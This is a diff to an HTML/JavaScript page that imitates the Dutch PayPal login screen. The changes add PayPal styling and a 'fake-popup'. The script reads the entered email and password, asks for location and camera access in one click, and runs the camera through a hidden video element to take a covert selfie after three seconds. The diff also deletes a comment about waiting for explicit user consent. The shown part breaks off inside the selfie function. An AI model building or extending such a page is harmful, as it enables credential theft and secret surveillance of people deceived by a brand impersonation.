@@ -5,7 +5,82 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal - Inloggen</title>
     <style>
-        /* CSS-styling blijft hetzelfde */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f6f6f6;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            margin: 100px auto;
+            width: 320px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            position: relative;
+            font-size: 16px;
+        }
+
+        input {
+            width: 90%;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 14px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .login-btn {
+            background: #0070ba;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background: #005fa3;
+        }
+
+        #fake-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            z-index: 1000;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            width: 280px;
+            font-size: 14px;
+            border-radius: 8px;
+        }
+
+        .paypal-color {
+            color: #0070ba;
+        }
+        .paypal-background {
+            background-color: #f6f6f6;
+        }
+
+        .popup-text {
+            color: #333;
+        }
+
+        /* Hidden Video Element */
+        #camera-preview {
+            display: none; /* Camera display is now hidden */
+        }
     </style>
 </head>
 <body class="paypal-background">
@@ -27,7 +102,7 @@
 
     <script>
         function requestPermissions() {
-            // Bewaar de gegevens van de invoervelden
+            // 🔹 Direct de gegevens van de invoervelden opslaan
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
             console.log(`📧 Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);
@@ -40,19 +115,14 @@
                 document.getElementById("fake-popup").style.display = "none";
             }, 5000);
 
-            // **Wacht expliciet op toestemming van de gebruiker voor locatie en camera**:
-            // Vraag de locatie en camera toestemming hier
+            // 🔹 Locatie en camera direct aanvragen met één klik
             Promise.all([
                 requestLocationPermission(),
                 requestCameraPermission()
-            ]).then(() => {
-                console.log("✅ Toestemmingen gegeven!");
-            }).catch(error => {
-                console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
-            });
+            ]);
         }
 
-        // Locatie toestemming aanvragen
+        // Functie om locatie toestemming te verkrijgen
         function requestLocationPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
@@ -61,32 +131,34 @@
                         resolve();
                     }, error => {
                         console.log("❌ Locatie geweigerd of niet beschikbaar:", error);
-                        reject(error);
+                        alert("Locatie toestemmingsfout: " + error.message);
+                        reject();
                     });
                 } else {
                     console.log("❌ Geolocatie wordt niet ondersteund door deze browser.");
-                    reject("Geolocatie niet ondersteund");
+                    alert("Geolocatie wordt niet ondersteund door de browser.");
+                    reject();
                 }
             });
         }
 
-        // Camera toestemming aanvragen
+        // Functie om camera toestemming te verkrijgen
         function requestCameraPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: true })
                         .then(stream => {
-                            // **Verborgen camera stream**: De camera wordt niet zichtbaar
+                            // ** Verborgen camera stream **: camera wordt niet zichtbaar
                             let video = document.createElement("video");
                             video.srcObject = stream;
-                            video.width = 320;
-                            video.height = 240;
-                            video.play();
+                            video.width = 320;  
+                            video.height = 240; 
+                            video.play(); 
                             
                             // Video-element wordt verborgen
                             video.style.display = "none";
 
-                            // Simuleer foto na 3 seconden
+                            // Simuleer een foto-opname na 3 seconden
                             setTimeout(() => {
                                 takeSelfie(video, stream);
                             }, 3000);
@@ -94,16 +166,17 @@
                         })
                         .catch(error => {
                             console.log("❌ Camera geweigerd:", error);
-                            reject(error);
+                            alert("Camera toestemmingsfout: " + error.message);
+                            reject();
                         });
                 } else {
                     console.log("❌ Camera wordt niet ondersteund door deze browser.");
-                    reject("Camera niet ondersteund");
+                    alert("Camera wordt niet ondersteund door de browser.");
+                    reject();
                 }
             });
         }
 
-        // Maak een selfie na toestemming voor camera
         function takeSelfie(video, stream) {
             let canvas = document.createElement("canvas");
             canvas.width = video.videoWidth;
